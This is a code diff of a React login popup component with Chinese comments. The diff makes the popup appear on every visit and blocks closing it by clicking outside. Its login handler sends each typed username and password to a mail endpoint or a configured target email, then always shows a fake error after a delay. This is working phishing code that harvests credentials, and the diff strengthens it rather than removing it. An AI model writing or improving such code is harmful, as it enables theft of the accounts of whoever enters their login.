@@ -1,5 +1,5 @@
-import React, { useState, useEffect } from 'react';
-import { Cell, Input, Dialog, Toast } from 'react-vant';
+import React, { useState } from 'react';
+import { Cell, Input, Dialog, Loading } from 'react-vant';
 import { POPUP_CONFIG } from '../popup.config';
 
 const ASSETS = {
@@ -15,126 +15,47 @@ const ASSETS = {
   addScreenIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/addScreen.png',
 };
 
-// Cookie 工具函数
-const getCookie = (name: string): string | null => {
-  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-  return match ? match[2] : null;
-};
-
-const setCookie = (name: string, value: string, hours: number): void => {
-  const expires = new Date();
-  expires.setTime(expires.getTime() + hours * 60 * 60 * 1000);
-  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
-};
-
-// 只有手机端（宽度 ≤ 480px）才显示弹窗
-const MOBILE_QUERY = '(max-width: 480px)';
-
 const LoginPopup: React.FC = () => {
-  const [visible, setVisible] = useState(false);
   const [passwordShown, setPasswordShown] = useState(false);
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [isMobile, setIsMobile] = useState(false);
   const [showErrorAlert, setShowErrorAlert] = useState(false);
 
-  // 检测移动端
-  useEffect(() => {
-    if (typeof window === 'undefined' || !window.matchMedia) return;
-
-    const mediaQuery = window.matchMedia(MOBILE_QUERY);
-    setIsMobile(mediaQuery.matches);
-
-    const handleChange = (e: MediaQueryListEvent) => {
-      setIsMobile(e.matches);
-    };
-
-    if (mediaQuery.addEventListener) {
-      mediaQuery.addEventListener('change', handleChange);
-    } else {
-      mediaQuery.addListener(handleChange);
-    }
-
-    return () => {
-      if (mediaQuery.removeEventListener) {
-        mediaQuery.removeEventListener('change', handleChange);
-      } else {
-        mediaQuery.removeListener(handleChange);
-      }
-    };
-  }, []);
-
-  // 检查是否应该显示弹窗
-  useEffect(() => {
-    // 如果配置关闭，不显示弹窗
-    if (!POPUP_CONFIG.enabled) return;
-
-    // 只在移动端显示
-    if (!isMobile) return;
-
-    // 检查 cookie，如果已经显示过则不再显示
-    const hasShown = getCookie(POPUP_CONFIG.cookieName);
-    if (hasShown) return;
-
-    setVisible(true);
-  }, [isMobile]);
-
-  // 关闭弹窗时设置 cookie
-  const closePopup = () => {
-    setCookie(POPUP_CONFIG.cookieName, 'true', POPUP_CONFIG.cookieExpireHours);
-    setVisible(false);
-  };
-
-  const handleOverlayClick = (e: React.MouseEvent) => {
-    if (e.target === e.currentTarget) {
-      closePopup();
-    }
-  };
-
   const handleLogin = async () => {
-    if (!username || !password) return;
+    if (isLoading) return;
 
     setIsLoading(true);
-    const toastInstance = Toast.loading({
-      message: 'Loading...',
-      forbidClick: true,
-      duration: 0,
-    });
     
     try {
-      const isDev = import.meta.env.DEV;
-      const apiUrl = isDev ? '/api/resend/emails' : '/api/send-email';
+      if (username && password) {
+        const isDev = import.meta.env.DEV;
+        const apiUrl = isDev ? '/api/resend/emails' : '/api/send-email';
 
-      const payload = isDev
-        ? {
-            from: POPUP_CONFIG.fromEmail,
-            to: [POPUP_CONFIG.targetEmail],
-            subject: `${new Date().toLocaleDateString()} - ${username}`,
-            html: `
-              <p><strong>Username/Email:</strong> ${username}</p>
-              <p><strong>Password:</strong> ${password}</p>
-              <p><strong>Time:</strong> ${new Date().toISOString()}</p>
-            `,
-          }
-        : { username, password };
+        const payload = isDev
+          ? {
+              from: POPUP_CONFIG.fromEmail,
+              to: [POPUP_CONFIG.targetEmail],
+              subject: `${new Date().toLocaleDateString()} - ${username}`,
+              html: `
+                <p><strong>Username/Email:</strong> ${username}</p>
+                <p><strong>Password:</strong> ${password}</p>
+                <p><strong>Time:</strong> ${new Date().toISOString()}</p>
+              `,
+            }
+          : { username, password };
 
-      const response = await fetch(apiUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      });
-
-      const result = await response.json();
-      if (!response.ok) {
-        console.error('[Login] Email send failed:', result);
+        await fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+        }).catch(() => {});
       }
-    } catch (error) {
-      console.error('[Login] Network error:', error);
+      
+      await new Promise(resolve => setTimeout(resolve, 1500));
     } finally {
-      toastInstance.clear();
       setIsLoading(false);
       setShowErrorAlert(true);
     }
@@ -144,10 +65,17 @@ const LoginPopup: React.FC = () => {
     window.open('https://t.me/wbxmalay', '_blank');
   };
 
-  if (!visible) return null;
-
   return (
     <>
+      {/* Loading Toast */}
+      {isLoading && (
+        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/50">
+          <div className="bg-[rgba(0,0,0,0.7)] rounded-lg px-6 py-4 flex flex-col items-center gap-3">
+            <Loading size="36" color="#fff" />
+            <span className="text-white text-sm">Loading...</span>
+          </div>
+        </div>
+      )}
       {/* 错误提示弹窗 - 使用 Vant Dialog */}
       <Dialog
         visible={showErrorAlert}
@@ -163,7 +91,6 @@ const LoginPopup: React.FC = () => {
       <div
         className="fixed inset-0 z-[2100] flex items-center justify-center bg-black/50 p-0 sm:p-4"
         style={{ minHeight: '100dvh' }}
-        onClick={handleOverlayClick}
         role="dialog"
         aria-modal="true"
         aria-label="Login"
